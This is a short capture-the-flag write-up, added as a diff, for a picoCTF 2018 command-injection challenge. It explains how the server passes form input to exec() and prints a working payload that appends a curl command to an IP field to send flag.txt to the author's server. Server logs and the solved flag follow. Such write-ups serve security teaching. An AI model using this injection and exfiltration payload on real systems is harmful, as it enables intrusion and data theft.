@@ -1,0 +1,17 @@
+The problem shows us that the website is pretty much directly inputting user input into exec()
+which is a huge no-no. Another thing to note is that the client side input validation and the server-side input validation are different:
+The client requires the user to input an ip address as the entire input, as denoted by the ^ and $ symbols.
+It turns out that we can execute whatever we want by adding commands after the ip address, as long
+as we directly send the form data to the server.
+
+I know that the hint mentions setting up a reverse shell, but that's definitely unnecessary, since we can just
+make the server send a request to my own server with information in the form data.
+
+$ curl "2018shell3.picoctf.com:31070/index.php" --data 'ip=127.0.0.1; curl <redacted server ip> --data q="$(cat flag.txt)"'
+..snip..
+ImmutableMultiDict([('q', u'flag.txt\nindex.php\nindex.txt\nxinet_startup.sh')])
+18.224.26.75 - - [05/Oct/2018 07:51:39] "POST / HTTP/1.1" 200 -
+ImmutableMultiDict([('q', u'Here is your flag: picoCTF{n3v3r_trust_a_b0x_91345b04}')])
+..snip..
+
+picoCTF{n3v3r_trust_a_b0x_91345b04}
